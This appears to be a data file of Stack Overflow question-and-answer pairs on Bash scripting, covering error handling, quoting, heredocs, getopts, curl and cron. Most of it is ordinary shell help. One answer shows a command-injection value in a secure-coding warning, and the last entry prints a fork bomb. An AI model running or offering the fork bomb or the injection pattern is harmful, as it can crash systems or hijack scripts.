    "What does 'set -e' mean in a Bash script?": "From help set and Bash Reference Documentation: The Set Builtin:\n  -e  Exit immediately if a command exits with a non-zero status.\nBut it's considered bad practice by some (Bash FAQ and IRC Freenode #bash FAQ authors). It's recommended to use:\ntrap 'do_something' ERR\nto run do_something function when errors occur.\nSee Why doesn't set -e (or set -o errexit, or trap ERR) do what I expected?",
    "Shell command to tar directory excluding certain files/folders [closed]": "You can have multiple exclude options for tar so\n$ tar --exclude='./folder' --exclude='./upload/folder2' -zcvf /backup/filename.tgz .\netc will work. Make sure to put --exclude before the source and destination items.",
    "Shell command to sum integers, one per line?": "Bit of awk should do it?\nawk '{s+=$1} END {print s}' mydatafile\nNote: some versions of awk have some odd behaviours if you are going to be adding anything exceeding 2^31 (2147483647). See comments for more background. One suggestion is to use printf rather than print:\nawk '{s+=$1} END {printf \"%.0f\", s}' mydatafile",
    "How do I put an already-running process under nohup?": "Using the Job Control of bash to send the process into the background:\nCtrl+Z to stop (pause) the program and get back to the shell.\nbg to run it in the background.\ndisown -h [job-spec] where [job-spec] is the job number (like %1 for the first running job; find about your number with the jobs command) so that the job isn't killed when the terminal closes.",
    "How to add line break to 'git commit -m' from the command line?": "Certainly, how it's done depends on your shell. In Bash, you can use single quotes around the message and can just leave the quote open, which will make Bash prompt for another line, until you close the quote. Like this:\ngit commit -m 'Message\n\ngoes\nhere'\nAlternatively, you can use a \"here document\" (also known as heredoc):\ngit commit -F- <<EOF\nMessage\n\ngoes\nhere\nEOF",
    "Count number of lines in a git repository": "xargs will let you cat all the files together before passing them to wc, like you asked:\ngit ls-files | xargs cat | wc -l\nBut skipping the intermediate cat gives you more information and is probably better:\ngit ls-files | xargs wc -l",
    "Given two directory trees, how can I find out which files differ by content? [closed]": "Try:\ndiff --brief --recursive dir1/ dir2/\nOr alternatively, with the short flags -qr:\ndiff -qr dir1/ dir2/\nIf you also want to see differences for files that may not exist in either directory:\ndiff --brief --recursive --new-file dir1/ dir2/  # with long options\ndiff -qrN dir1/ dir2/                            # with short flag aliases",
    "When do we need curly braces around shell variables?": "In this particular example, it makes no difference. However, the {} in ${} are useful if you want to expand the variable foo in the string\n\"${foo}bar\"\nsince \"$foobar\" would instead expand the variable identified by foobar.\nCurly braces are also unconditionally required when:\nexpanding array elements, as in ${array[42]}\nusing parameter expansion operations, as in ${filename%.*} (remove extension; strips smallest match)\nexpanding positional parameters beyond 9: \"$8 $9 ${10} ${11}\"\nDoing this everywhere, instead of just in potentially ambiguous cases, can be considered good programming practice. This is both for consistency and to avoid surprises like $foo_$bar.jpg, where it's not visually obvious that the underscore becomes part of the variable name.",
    "How can I compare numbers in Bash?": "In Bash, you should do your check in an arithmetic context:\nif (( a > b )); then\n    ...\nfi\nFor POSIX shells that don't support (()), you can use -lt and -gt.\nif [ \"$a\" -gt \"$b\" ]; then\n    ...\nfi\nYou can get a full list of comparison operators with help test or man test.",
    "Use grep --exclude/--include syntax to not grep through certain files": "Use the shell globbing syntax:\ngrep pattern -r --include=\\*.cpp --include=\\*.h rootdir\nThe syntax for --exclude is identical.\nNote that the star is escaped with a backslash to prevent it from being expanded by the shell (quoting it, such as --include=\"*.cpp\", would work just as well). Otherwise, if you had any files in the current working directory that matched the pattern, the command line would expand to something like grep pattern -r --include=foo.cpp --include=bar.cpp rootdir, which would only search files named foo.cpp and bar.cpp, which is quite likely not what you wanted.\nUpdate 2021-03-04\nI've edited the original answer to remove the use of brace expansion, which is a feature provided by several shells such as Bash and zsh to simplify patterns like this; but note that brace expansion is not POSIX shell-compliant.\nThe original example was:\ngrep pattern -r --include=\\*.{cpp,h} rootdir\nto search through all .cpp and .h files rooted in the directory rootdir.",
    "Difference between single and double quotes in Bash": "Single quotes won't interpolate anything, but double quotes will. For example: variables, backticks, certain \\ escapes, etc.\nExample:\n$ echo \"$(echo \"upg\")\"\nupg\n$ echo '$(echo \"upg\")'\n$(echo \"upg\")\nThe Bash manual has this to say:\n3.1.2.2 Single Quotes\nEnclosing characters in single quotes (') preserves the literal value of each character within the quotes. A single quote may not occur between single quotes, even when preceded by a backslash.\n3.1.2.3 Double Quotes\nEnclosing characters in double quotes (\") preserves the literal value of all characters within the quotes, with the exception of $, `, \\, and, when history expansion is enabled, !. The characters $ and ` retain their special meaning within double quotes (see Shell Expansions). The backslash retains its special meaning only when followed by one of the following characters: $, `, \", \\, or newline. Within double quotes, backslashes that are followed by one of these characters are removed. Backslashes preceding characters without a special meaning are left unmodified. A double quote may be quoted within double quotes by preceding it with a backslash. If enabled, history expansion will be performed unless an ! appearing in double quotes is escaped using a backslash. The backslash preceding the ! is not removed.\nThe special parameters * and @ have special meaning when in double quotes (see Shell Parameter Expansion).",
    "Redirect stderr and stdout in Bash [duplicate]": "Take a look here. It should be:\nyourcommand &> filename\nIt redirects both standard output and standard error to file filename.",
    "How do I test if a variable is a number in Bash?": "One approach is to use a regular expression, like so:\nre='^[0-9]+$'\nif ! [[ $yournumber =~ $re ]] ; then\n   echo \"error: Not a number\" >&2; exit 1\nfi\nIf the value is not necessarily an integer, consider amending the regex appropriately; for instance:\n^[0-9]+([.][0-9]+)?$\n...or, to handle numbers with a sign:\n^[+-]?[0-9]+([.][0-9]+)?$",
    "How can I copy the output of a command directly into my clipboard?": "One way of doing it follows:\nInstall xclip, such as:\nsudo apt-get install xclip\nPipe the output into xclip to be copied into the clipboard:\ncat file | xclip\nPaste the text you just copied into a X application:\nxclip -o\nTo paste somewhere else other than an X application, such as a text area of a web page in a browser window, use:\ncat file | xclip -selection clipboard\nConsider creating an alias:\nalias \"c=xclip\"\nalias \"v=xclip -o\"\nTo see how useful this is, imagine I want to open my current path in a new terminal window (there may be other ways of doing it like Ctrl+T on some systems, but this is just for illustration purposes):\nTerminal 1:\npwd | c\n\nTerminal 2:\ncd `v`\nNotice the ` ` around v. This executes v as a command first and then substitutes it in-place for cd to use.\nOnly copy the content to the X clipboard\ncat file | xclip",
    "Bash tool to get nth line from a file": "head and pipe with tail will be slow for a huge file. I would suggest sed like this:\nsed 'NUMq;d' file\nWhere NUM is the number of the line you want to print; so, for example, sed '10q;d' file to print the 10th line of file.\nExplanation:\nNUMq will quit immediately when the line number is NUM.\nd will delete the line instead of printing it; this is inhibited on the last line because the q causes the rest of the script to be skipped when quitting.\nIf you have NUM in a variable, you will want to use double quotes instead of single:\nsed \"${NUM}q;d\" file",
    "How to 'grep' a continuous stream?": "Turn on grep's line buffering mode when using BSD grep (FreeBSD, Mac OS X etc.)\ntail -f file | grep --line-buffered my_pattern\nIt looks like a while ago --line-buffered didn't matter for GNU grep (used on pretty much any Linux) as it flushed by default (YMMV for other Unix-likes such as SmartOS, AIX or QNX). However, as of November 2020, --line-buffered is needed (at least with GNU grep 3.5 in openSUSE, but it seems generally needed based on comments below).",
    "How can I reverse the order of lines in a file?": "Also worth mentioning: tac (the, ahem, reverse of cat). Part of coreutils.\nFlipping one file into another\ntac a.txt > b.txt",
    "Automatic exit from Bash shell script on error [duplicate]": "Use the set -e builtin:\n#!/bin/bash\nset -e\n# Any subsequent(*) commands which fail will cause the shell script to exit immediately\nAlternatively, you can pass -e on the command line:\nbash -e my_script.sh\nYou can also disable this behavior with set +e.\nYou may also want to employ all or some of the the -e -u -x and -o pipefail options like so:\nset -euxo pipefail\n-e exits on error, -u errors on undefined variables, -x prints commands before execution, and -o (for option) pipefail exits on command pipe failures. Some gotchas and workarounds are documented well here.\n(*) Note:\nThe shell does not exit if the command that fails is part of the command list immediately following a while or until keyword, part of the test following the if or elif reserved words, part of any command executed in a && or || list except the command following the final && or ||, any command in a pipeline but the last, or if the command's return value is being inverted with !\n(from man bash)",
    "Why can't I change directories using \"cd\" in a script?": "Shell scripts are run inside a subshell, and each subshell has its own concept of what the current directory is. The cd succeeds, but as soon as the subshell exits, you're back in the interactive shell and nothing ever changed there.\nOne way to get around this is to use an alias instead:\nalias proj=\"cd /home/tree/projects/java\"",
    "How to determine the current interactive shell that I'm in (command-line)": "There are three approaches to finding the name of the current shell's executable:\nPlease note that all three approaches can be fooled if the executable of the shell is /bin/sh, but it's really a renamed bash, for example (which frequently happens).\nThus your second question of whether ps output will do is answered with \"not always\".\necho $0 - will print the program name... which in the case of the shell is the actual shell.\nps -ef | grep $$ | grep -v grep - this will look for the current process ID in the list of running processes. Since the current process is the shell, it will be included.\nThis is not 100% reliable, as you might have other processes whose ps listing includes the same number as shell's process ID, especially if that ID is a small number (for example, if the shell's PID is \"5\", you may find processes called \"java5\" or \"perl5\" in the same grep output!). This is the second problem with the \"ps\" approach, on top of not being able to rely on the shell name.\necho $SHELL - The path to the current shell is stored as the SHELL variable for any shell. The caveat for this one is that if you launch a shell explicitly as a subprocess (for example, it's not your login shell), you will get your login shell's value instead. If that's a possibility, use the ps or $0 approach.\nIf, however, the executable doesn't match your actual shell (e.g. /bin/sh is actually bash or ksh), you need heuristics. Here are some environmental variables specific to various shells:\n$version is set on tcsh\n$BASH is set on bash\n$shell (lowercase) is set to actual shell name in csh or tcsh\n$ZSH_NAME is set on zsh\nksh has $PS3 and $PS4 set, whereas the normal Bourne shell (sh) only has $PS1 and $PS2 set. This generally seems like the hardest to distinguish - the only difference in the entire set of environment variables between sh and ksh we have installed on Solaris boxen is $ERRNO, $FCEDIT, $LINENO, $PPID, $PS3, $PS4, $RANDOM, $SECONDS, and $TMOUT.\nUPDATE: Someone brought up \"ash\" (Almquist Shell) in comments. There seem to be 2001 variants of it including dash; so in the interest of not blowing up the answer unnecessarily, here's a very useful page listing a ton of various flavours of ash and their differences from each other and often from stanard Bourne sh: https://www.in-ulm.de/~mascheck/various/ash/",
    "How to use ADB Shell when Multiple Devices are connected? Fails with \"error: more than one device and emulator\"": "",
    "How do I know the script file name in a Bash script?": "me=$(basename \"$0\")\nFor reading through a symlink1, which is usually not what you want (you usually don't want to confuse the user this way), try:\nme=\"$(basename \"$(test -L \"$0\" && readlink \"$0\" || echo \"$0\")\")\"\nIMO, that'll produce confusing output. \"I ran foo.sh, but it's saying I'm running bar.sh!? Must be a bug!\" Besides, one of the purposes of having differently-named symlinks is to provide different functionality based on the name it's called as (think gzip and gunzip on some platforms).\n1 That is, to resolve symlinks such that when the user executes foo.sh which is actually a symlink to bar.sh, you wish to use the resolved name bar.sh rather than foo.sh.",
    "How to read a file into a variable in shell?": "In cross-platform, lowest-common-denominator sh you use:\n#!/bin/sh\nvalue=`cat config.txt`\necho \"$value\"\nIn bash or zsh, to read a whole file into a variable without invoking cat:\n#!/bin/bash\nvalue=$(<config.txt)\necho \"$value\"\nInvoking cat in bash or zsh to slurp a file would be considered a Useless Use of Cat.\nNote that it is not necessary to quote the command substitution to preserve newlines.\nSee: Bash Hacker's Wiki - Command substitution - Specialities.",
    "Check if pull needed in Git": "First use git remote update, to bring your remote refs up to date. Then you can do one of several things, such as:\ngit status -uno will tell you whether the branch you are tracking is ahead, behind or has diverged. If it says nothing, the local and remote are the same.\ngit show-branch *master will show you the commits in all of the branches whose names end in 'master' (eg master and origin/master).\nIf you use -v with git remote update (git remote -v update) you can see which branches got updated, so you don't really need any further commands.\nHowever, it looks like you want to do this in a script or program and end up with a true/false value. If so, there are ways to check the relationship between your current HEAD commit and the head of the branch you're tracking, although since there are four possible outcomes you can't reduce it to a yes/no answer. However, if you're prepared to do a pull --rebase then you can treat \"local is behind\" and \"local has diverged\" as \"need to pull\", and the other two (\"local is ahead\" and \"same\") as \"don't need to pull\".\nYou can get the commit id of any ref using git rev-parse <ref>, so you can do this for master and origin/master and compare them. If they're equal, the branches are the same. If they're unequal, you want to know which is ahead of the other. Using git merge-base master origin/master will tell you the common ancestor of both branches, and if they haven't diverged this will be the same as one or the other. If you get three different ids, the branches have diverged.\nTo do this properly, eg in a script, you need to be able to refer to the current branch, and the remote branch it's tracking. The bash prompt-setting function in /etc/bash_completion.d has some useful code for getting branch names. However, you probably don't actually need to get the names. Git has some neat shorthands for referring to branches and commits (as documented in git rev-parse --help). In particular, you can use @ for the current branch (assuming you're not in a detached-head state) and @{u} for its upstream branch (eg origin/master). So git merge-base @ @{u} will return the (hash of the) commit at which the current branch and its upstream diverge and git rev-parse @ and git rev-parse @{u} will give you the hashes of the two tips. This can be summarized in the following script:\n#!/bin/sh\n\nUPSTREAM=${1:-'@{u}'}\nLOCAL=$(git rev-parse @)\nREMOTE=$(git rev-parse \"$UPSTREAM\")\nBASE=$(git merge-base @ \"$UPSTREAM\")\n\nif [ $LOCAL = $REMOTE ]; then\n    echo \"Up-to-date\"\nelif [ $LOCAL = $BASE ]; then\n    echo \"Need to pull\"\nelif [ $REMOTE = $BASE ]; then\n    echo \"Need to push\"\nelse\n    echo \"Diverged\"\nfi\nNote: older versions of git didn't allow @ on its own, so you may have to use @{0} instead.\nThe line UPSTREAM=${1:-'@{u}'} allows you optionally to pass an upstream branch explicitly, in case you want to check against a different remote branch than the one configured for the current branch. This would typically be of the form remotename/branchname. If no parameter is given, the value defaults to @{u}.\nThe script assumes that you've done a git fetch or git remote update first, to bring the tracking branches up to date. I didn't build this into the script because it's more flexible to be able to do the fetching and the comparing as separate operations, for example if you want to compare without fetching because you already fetched recently.",
    "How to append output to the end of a text file": "Use >> instead of > when directing output to a file:\nyour_command >> file_to_append_to\nIf file_to_append_to does not exist, it will be created.\nExample:\n$ echo \"hello\" > file\n$ echo \"world\" >> file\n$ cat file \nhello\nworld",
    "How to obtain the absolute path of a file via Shell (BASH/ZSH/SH)?": "Use realpath\n$ realpath example.txt\n/home/username/example.txt",
    "sudo echo \"something\" >> /etc/privilegedFile doesn't work [duplicate]": "Use tee --append or tee -a.\necho 'deb blah ... blah' | sudo tee -a /etc/apt/sources.list\nMake sure to avoid quotes inside quotes.\nTo avoid printing data back to the console, redirect the output to /dev/null.\necho 'deb blah ... blah' | sudo tee -a /etc/apt/sources.list > /dev/null\nRemember about the (-a/--append) flag! Just tee works like > and will overwrite your file. tee -a works like >> and will write at the end of the file.",
    "Multi-line string with extra space (preserved indentation)": "Heredoc sounds more convenient for this purpose. It is used to send multiple commands to a command interpreter program like ex or cat\ncat << EndOfMessage\nThis is line 1.\nThis is line 2.\nLine 3.\nEndOfMessage\nThe string after << indicates where to stop.\nTo send these lines to a file, use:\ncat > $FILE <<- EOM\nLine 1.\nLine 2.\nEOM\nYou could also store these lines to a variable:\nread -r -d '' VAR << EOM\nThis is line 1.\nThis is line 2.\nLine 3.\nEOM\nThis stores the lines to the variable named VAR.\nWhen printing, remember the quotes around the variable otherwise you won't see the newline characters.\necho \"$VAR\"\nEven better, you can use indentation to make it stand out more in your code. This time just add a - after << to stop the tabs from appearing.\nread -r -d '' VAR <<- EOM\n    This is line 1.\n    This is line 2.\n    Line 3.\nEOM\nBut then you must use tabs, not spaces, for indentation in your code.",
    "Command not found error in Bash variable assignment": "You cannot have spaces around the = sign.\nWhen you write:\nSTR = \"foo\"\nbash tries to run a command named STR with 2 arguments (the strings = and foo)\nWhen you write:\nSTR =foo\nbash tries to run a command named STR with 1 argument (the string =foo)\nWhen you write:\nSTR= foo\nbash tries to run the command foo with STR set to the empty string in its environment.\nI'm not sure if this helps to clarify or if it is mere obfuscation, but note that:\nthe first command is exactly equivalent to: STR \"=\" \"foo\",\nthe second is the same as STR \"=foo\",\nand the last is equivalent to STR=\"\" foo.\nThe relevant section of the sh language spec, section 2.9.1 states:\nA \"simple command\" is a sequence of optional variable assignments and redirections, in any sequence, optionally followed by words and redirections, terminated by a control operator.\nIn that context, a word is the command that bash is going to run. Any string containing = (in any position other than at the beginning of the string) which is not a redirection and in which the portion of the string before the = is a valid variable name is a variable assignment, while any string that is not a redirection or a variable assignment is a command. In STR = \"foo\", STR is not a variable assignment.",
    "How can I clear previous output in Terminal in Mac OS X?": "To clear the terminal manually:\n\u2318+K\nCommand+K for newer keyboards\nTo clear the terminal from within a shell script;\n/usr/bin/osascript -e 'tell application \"System Events\" to tell process \"Terminal\" to keystroke \"k\" using command down'",
    "Using wget to recursively fetch a directory with arbitrary files in it": "You have to pass the -np/--no-parent option to wget (in addition to -r/--recursive, of course), otherwise it will follow the link in the directory index on my site to the parent directory. So the command would look like this:\nwget --recursive --no-parent http://example.com/configs/.vim/\nTo avoid downloading the auto-generated index.html files, use the -R/--reject option:\nwget -r -np -R \"index.html*\" http://example.com/configs/.vim/",
    "Colorized grep -- viewing the entire file with highlighted matches": "Here are some ways to do it:\ngrep --color 'pattern\\|$' file\ngrep --color -E 'pattern|$' file\negrep --color 'pattern|$' file\nThe | symbol is the OR operator. Either escape it using \\ or tell grep that the search text has to be interpreted as regular expressions by adding -E or using the egrep command instead of grep.\nThe search text \"pattern|$\" is actually a trick, it will match lines that have pattern OR lines that have an end. Because all lines have an end, all lines are matched, but the end of a line isn't actually any characters, so it won't be colored.\nTo also pass the colored parts through pipes, e.g. towards less, provide the always parameter to --color:\ngrep --color=always 'pattern\\|$' file | less -r\ngrep --color=always -E 'pattern|$' file | less -r\negrep --color=always 'pattern|$' file | less -r",
    "Unix shell script find out which directory the script file resides?": "In Bash, you should get what you need like this:\n#!/usr/bin/env bash\n\nBASEDIR=$(dirname \"$0\")\necho \"$BASEDIR\"",
    "Expansion of variables inside single quotes in a command in Bash": "Inside single quotes everything is preserved literally, without exception.\nThat means you have to close the quotes, insert something, and then re-enter again.\n'before'\"$variable\"'after'\n'before'\"'\"'after'\n'before'\\''after'\nWord concatenation is simply done by juxtaposition. As you can verify, each of the above lines is a single word to the shell. Quotes (single or double quotes, depending on the situation) don't isolate words. They are only used to disable interpretation of various special characters, like whitespace, $, ;... For a good tutorial on quoting see Mark Reed's answer. Also relevant: Which characters need to be escaped in bash?\nDo not concatenate strings interpreted by a shell\nYou should absolutely avoid building shell commands by concatenating variables. This is a bad idea similar to concatenation of SQL fragments (SQL injection!).\nUsually it is possible to have placeholders in the command, and to supply the command together with variables so that the callee can receive them from the invocation arguments list.\nFor example, the following is very unsafe. DON'T DO THIS\nscript=\"echo \\\"Argument 1 is: $myvar\\\"\"\n/bin/sh -c \"$script\"\nIf the contents of $myvar is untrusted, here is an exploit:\nmyvar='foo\"; echo \"you were hacked'\nInstead of the above invocation, use positional arguments. The following invocation is better -- it's not exploitable:\nscript='echo \"arg 1 is: $1\"'\n/bin/sh -c \"$script\" -- \"$myvar\"\nNote the use of single ticks in the assignment to script, which means that it's taken literally, without variable expansion or any other form of interpretation.",
    "Process all arguments except the first one (in a bash script)": "Use this:\necho \"${@:2}\"\nThe following syntax:\necho \"${*:2}\"\nwould work as well, but is not recommended, because as @Gordon already explained, that using *, it runs all of the arguments together as a single argument with spaces, while @ preserves the breaks between them (even if some of the arguments themselves contain spaces). It doesn't make the difference with echo, but it matters for many other commands.",
    "What is the difference between \"#!/usr/bin/env bash\" and \"#!/usr/bin/bash\"?": "Running a command through /usr/bin/env has the benefit of looking for whatever the default version of the program is in your current environment.\nThis way, you don't have to look for it in a specific place on the system, as those paths may be in different locations on different systems. As long as it's in your path, it will find it.\nOne downside is that you will be unable to pass more than one argument (e.g. you will be unable to write /usr/bin/env awk -f) if you wish to support Linux, as POSIX is vague on how the line is to be interpreted, and Linux interprets everything after the first space to denote a single argument. You can use /usr/bin/env -S on some versions of env to get around this, but then the script will become even less portable and break on fairly recent systems (e.g. even Ubuntu 16.04 if not later).\nAnother downside is that since you aren't calling an explicit executable, it's got the potential for mistakes, and on multiuser systems security problems (if someone managed to get their executable called bash in your path, for example).\n#!/usr/bin/env bash #lends you some flexibility on different systems\n#!/usr/bin/bash     #gives you explicit control on a given system of what executable is called\nIn some situations, the first may be preferred (like running python scripts with multiple versions of python, without having to rework the executable line). But in situations where security is the focus, the latter would be preferred, as it limits code injection possibilities.",
    "OS X: equivalent of Linux's wget": "The following native command will work:\ncurl http://127.0.0.1:8000 -o outfile\nNote that curl does not follow redirects by default. To tell it to do so, add -L to the argument list.",
    "Is there a TRY CATCH command in Bash": "Is there a TRY CATCH command in Bash?\nNo.\nBash doesn't have as many luxuries as one can find in many programming languages.\nThere is no try/catch in bash; however, one can achieve similar behavior using && or ||.\nUsing ||:\nif command1 fails then command2 runs as follows\ncommand1 || command2\nSimilarly, using &&, command2 will run if command1 is successful\nThe closest approximation of try/catch is as follows\n{ # try\n\n    command1 &&\n    #save your output\n\n} || { # catch\n    # save log for exception \n}\nAlso bash contains some error handling mechanisms, as well\nset -e\nit stops your script if any simple command fails.\nAnd also why not if...else. It is your best friend.",
    "Linux: copy and create destination dir if it does not exist": "mkdir -p \"$d\" && cp file \"$d\"\n(there's no such option for cp).",
    "Interactive shell using Docker Compose": "You need to include the following lines in your docker-compose.yml:\nversion: \"3\"\nservices:\n  app:\n    image: app:1.2.3\n    stdin_open: true # docker run -i\n    tty: true        # docker run -t\nThe first corresponds to -i in docker run and the second to -t.",
    "How to check the exit status using an 'if' statement [duplicate]": "Every command that runs has an exit status.\nThat check is looking at the exit status of the command that finished most recently before that line runs.\nIf you want your script to exit when that test returns true (the previous command failed) then you put exit 1 (or whatever) inside that if block after the echo.\nThat being said, if you are running the command and are wanting to test its output, using the following is often more straightforward.\nif some_command; then\n    echo command returned true\nelse\n    echo command returned some error\nfi\nOr to turn that around use ! for negation\nif ! some_command; then\n    echo command returned some error\nelse\n    echo command returned true\nfi\nNote though that neither of those cares what the error code is. If you know you only care about a specific error code then you need to check $? manually.",
    "Find and replace in file and overwrite file doesn't work, it empties the file": "When the shell sees > index.html in the command line it opens the file index.html for writing, wiping off all its previous contents.\nTo fix this you need to pass the -i option to sed to make the changes inline and create a backup of the original file before it does the changes in-place:\nsed -i.bak s/STRING_TO_REPLACE/STRING_TO_REPLACE_IT/g index.html\nWithout the .bak the command will fail on some platforms, such as Mac OSX.",
    "How to get a password from a shell script without echoing": "Here is another way to do it:\n#!/bin/bash\n# Read Password\necho -n Password: \nread -s password\necho\n# Run Command\necho $password\nThe read -s will turn off echo for you. Just replace the echo on the last line with the command you want to run.\nIn some shells (e.g. Bash) read supports -p prompt-string which will allow the echo and read commands to be combined:\nread -s -p \"Password: \" password",
    "Aborting a shell script if any command returns a non-zero value": "Add this to the beginning of the script:\nset -e\nThis will cause the shell to exit immediately if a simple command exits with a nonzero exit value. A simple command is any command not part of an if, while, or until test, or part of an && or || list.\nSee the bash manual on the \"set\" internal command for more details.\nIt's really annoying to have a script stubbornly continue when something fails in the middle and breaks assumptions for the rest of the script. I personally start almost all portable shell scripts with set -e.\nIf I'm working with bash specifically, I'll start with\nset -Eeuo pipefail\nThis covers more error handling in a similar fashion. I consider these as sane defaults for new bash programs. Refer to the bash manual for more information on what these options do.",
    "How to run a shell script on a Unix console or Mac terminal?": "To run a non-executable sh script, use:\nsh myscript\nTo run a non-executable bash script, use:\nbash myscript\nTo start an executable (which is any file with executable permission); you just specify it by its path:\n/foo/bar\n/bin/bar\n./bar\nTo make a script executable, give it the necessary permission:\nchmod +x bar\n./bar\nWhen a file is executable, the kernel is responsible for figuring out how to execte it. For non-binaries, this is done by looking at the first line of the file. It should contain a hashbang:\n#! /usr/bin/env bash\nThe hashbang tells the kernel what program to run (in this case the command /usr/bin/env is ran with the argument bash). Then, the script is passed to the program (as second argument) along with all the arguments you gave the script as subsequent arguments.\nThat means every script that is executable should have a hashbang. If it doesn't, you're not telling the kernel what it is, and therefore the kernel doesn't know what program to use to interprete it. It could be bash, perl, python, sh, or something else. (In reality, the kernel will often use the user's default shell to interprete the file, which is very dangerous because it might not be the right interpreter at all or it might be able to parse some of it but with subtle behavioural differences such as is the case between sh and bash).\nA note on /usr/bin/env\nMost commonly, you'll see hash bangs like so:\n#!/bin/bash\nThe result is that the kernel will run the program /bin/bash to interpret the script. Unfortunately, bash is not always shipped by default, and it is not always available in /bin. While on Linux machines it usually is, there are a range of other POSIX machines where bash ships in various locations, such as /usr/xpg/bin/bash or /usr/local/bin/bash.\nTo write a portable bash script, we can therefore not rely on hard-coding the location of the bash program. POSIX already has a mechanism for dealing with that: PATH. The idea is that you install your programs in one of the directories that are in PATH and the system should be able to find your program when you want to run it by name.\nSadly, you cannot just do this:\n#!bash\nThe kernel won't (some might) do a PATH search for you. There is a program that can do a PATH search for you, though, it's called env. Luckily, nearly all systems have an env program installed in /usr/bin. So we start env using a hardcoded path, which then does a PATH search for bash and runs it so that it can interpret your script:\n#!/usr/bin/env bash\nThis approach has one downside: According to POSIX, the hashbang can have one argument. In this case, we use bash as the argument to the env program. That means we have no space left to pass arguments to bash. So there's no way to convert something like #!/bin/bash -exu to this scheme. You'll have to put set -exu after the hashbang instead.\nThis approach also has another advantage: Some systems may ship with a /bin/bash, but the user may not like it, may find it's buggy or outdated, and may have installed his own bash somewhere else. This is often the case on OS X (Macs) where Apple ships an outdated /bin/bash and users install an up-to-date /usr/local/bin/bash using something like Homebrew. When you use the env approach which does a PATH search, you take the user's preference into account and use his preferred bash over the one his system shipped with.",
    "How to highlight bash/shell commands in markdown?": "If you are looking to highlight a shell session command sequence as it looks to the user (with prompts, not just as contents of a hypothetical script file), then the right identifier to use at the moment is console:\n```console\nfoo@bar:~$ whoami\nfoo\n```",
    "An example of how to use getopts in bash": "#!/bin/bash\n\nusage() { echo \"Usage: $0 [-s <45|90>] [-p <string>]\" 1>&2; exit 1; }\n\nwhile getopts \":s:p:\" o; do\n    case \"${o}\" in\n        s)\n            s=${OPTARG}\n            ((s == 45 || s == 90)) || usage\n            ;;\n        p)\n            p=${OPTARG}\n            ;;\n        *)\n            usage\n            ;;\n    esac\ndone\nshift $((OPTIND-1))\n\nif [ -z \"${s}\" ] || [ -z \"${p}\" ]; then\n    usage\nfi\n\necho \"s = ${s}\"\necho \"p = ${p}\"\nExample runs:\n$ ./myscript.sh\nUsage: ./myscript.sh [-s <45|90>] [-p <string>]\n\n$ ./myscript.sh -h\nUsage: ./myscript.sh [-s <45|90>] [-p <string>]\n\n$ ./myscript.sh -s \"\" -p \"\"\nUsage: ./myscript.sh [-s <45|90>] [-p <string>]\n\n$ ./myscript.sh -s 10 -p foo\nUsage: ./myscript.sh [-s <45|90>] [-p <string>]\n\n$ ./myscript.sh -s 45 -p foo\ns = 45\np = foo\n\n$ ./myscript.sh -s 90 -p bar\ns = 90\np = bar",
    "Using cURL to upload POST data with files": "You need to use the -F option:\n-F/--form <name=content> Specify HTTP multipart POST data (H)\nTry this:\ncurl \\\n  -F \"userid=1\" \\\n  -F \"filecomment=This is an image file\" \\\n  -F \"image=@/home/user1/Desktop/test.jpg\" \\\n  localhost/uploader.php",
    "How to join multiple lines of filenames into one with custom delimiter": "paste -s -d joins lines with a delimiter (e.g. \",\"), and does not leave a trailing delimiter:\nls -1 | paste -sd \",\" -",
    "Can a shell script set environment variables of the calling shell? [duplicate]": "Use the \"dot space script\" calling syntax. For example, here's how to do it using the full path to a script:\n. /path/to/set_env_vars.sh\nAnd here's how to do it if you're in the same directory as the script:\n. set_env_vars.sh\nThese execute the script under the current shell instead of loading another one (which is what would happen if you did ./set_env_vars.sh). Because it runs in the same shell, the environmental variables you set will be available when it exits.\nThis is the same thing as calling source set_env_vars.sh, but it's shorter to type and might work in some places where source doesn't.",
    "How to urlencode data for curl command?": "Use curl --data-urlencode; from man curl:\nThis posts data, similar to the other --data options with the exception that this performs URL-encoding. To be CGI-compliant, the <data> part should begin with a name followed by a separator and a content specification.\nExample usage:\ncurl \\\n    --data-urlencode \"paramName=value\" \\\n    --data-urlencode \"secondParam=value\" \\\n    http://example.com\nSee the man page for more info.\nThis requires curl 7.18.0 or newer (released January 2008). Use curl -V to check which version you have.\nYou can as well encode the query string:\ncurl --get \\\n    --data-urlencode \"p1=value 1\" \\\n    --data-urlencode \"p2=value 2\" \\\n    http://example.com\n    # http://example.com?p1=value%201&p2=value%202",
    "How to add a progress bar to a shell script?": "You can implement this by overwriting a line. Use \\r to go back to the beginning of the line without writing \\n to the terminal.\nWrite \\n when you're done to advance the line.\nUse echo -ne to:\nnot print \\n and\nto recognize escape sequences like \\r.\nHere's a demo:\necho -ne '#####                     (33%)\\r'\nsleep 1\necho -ne '#############             (66%)\\r'\nsleep 1\necho -ne '#######################   (100%)\\r'\necho -ne '\\n'\nIn a comment below, puk mentions this \"fails\" if you start with a long line and then want to write a short line: In this case, you'll need to overwrite the length of the long line (e.g., with spaces).",
    "How to get process ID of background process?": "You need to save the PID of the background process at the time you start it:\nfoo &\nFOO_PID=$!\n# do other stuff\nkill $FOO_PID\nYou cannot use job control, since that is an interactive feature and tied to a controlling terminal. A script will not necessarily have a terminal attached at all so job control will not necessarily be available.",
    "How to create a cron job using Bash automatically without the interactive editor?": "You can add to the crontab as follows:\n#write out current crontab\ncrontab -l > mycron\n#echo new cron into cron file\necho \"00 09 * * 1-5 echo hello\" >> mycron\n#install new cron file\ncrontab mycron\nrm mycron\nCron line explaination\n* * * * * \"command to be executed\"\n- - - - -\n| | | | |\n| | | | ----- Day of week (0 - 7) (Sunday=0 or 7)\n| | | ------- Month (1 - 12)\n| | --------- Day of month (1 - 31)\n| ----------- Hour (0 - 23)\n------------- Minute (0 - 59)\nSource nixCraft.",
    "How to put a line comment for a multi-line command [duplicate]": "This is how I do it. Essentially by using Bash's backtick command substitution one can place these comments anywhere along a long command line even if it is split across lines. I have put the echo command in front of your example so that you can execute the example and see how it works:\necho CommandName InputFiles `#1st comment` \\\n             --option1 arg1 `#2nd comment` \\\n             --option2 arg2 `#3rd comment`\nAnother example where you can put multiple comments at different points on one line:\nsome_cmd --opt1 `#1st comment` --opt2 `#2nd comment` --opt3 `#3rd comment`",
    "Why is whitespace sometimes needed around metacharacters?": "There is a list of characters that separate tokens in BASH. These characters are called metacharacters and they are |, &, ;, (, ), <, >, space and tab. On the other hand, curly braces ({ and }) are just ordinary characters that make up words.\nOmitting the second space before } will do, since & is a metacharacter. Therefore, your tattoo should have at least one space character.\n:(){ :|:&};:",
